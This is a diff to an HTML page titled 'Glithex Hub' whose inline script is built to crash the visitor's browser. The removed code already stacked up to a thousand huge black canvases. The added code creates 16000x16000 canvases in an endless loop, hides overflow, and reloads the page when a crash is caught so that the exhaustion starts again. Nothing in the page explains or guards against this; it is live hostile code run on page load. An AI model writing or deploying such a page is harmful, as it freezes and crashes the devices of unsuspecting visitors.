@@ -2,28 +2,30 @@
 <html>
 <head>
   <title>Glithex Hub</title>
+  <style>body{margin:0;padding:0;overflow:hidden;}</style>
 </head>
 <body>
 <script>
 function MainCanvas() {
-    let counter = 0;
-
-    function createCanvas() {
-        const canvas = document.createElement('canvas');
-        canvas.width = 20000;
-        canvas.height = 20000;
-        const ctx = canvas.getContext('2d');
-        ctx.fillStyle = 'rgb(0,0,0)';
-        ctx.fillRect(0, 0, canvas.width, canvas.height);
-        document.body.appendChild(canvas);
-        counter++;
-        if (counter < 1000) {
-            requestAnimationFrame(createCanvas);
+    try {
+        while (true) {
+            const canvas = document.createElement('canvas');
+            canvas.width = 16000;
+            canvas.height = 16000;
+            const ctx = canvas.getContext('2d');
+            ctx.fillStyle = 'black';
+            for (let i = 0; i < 100; i++) {
+                ctx.fillRect(
+                    Math.random() * canvas.width,
+                    Math.random() * canvas.height,
+                    1000,
+                    1000
+                );
+            }
+            document.body.appendChild(canvas);
         }
-    }
-
-    for (let i = 0; i < 10; i++) {
-        createCanvas();
+    } catch (e) {
+        location.reload(); // Reload if crash is caught
     }
 }
 
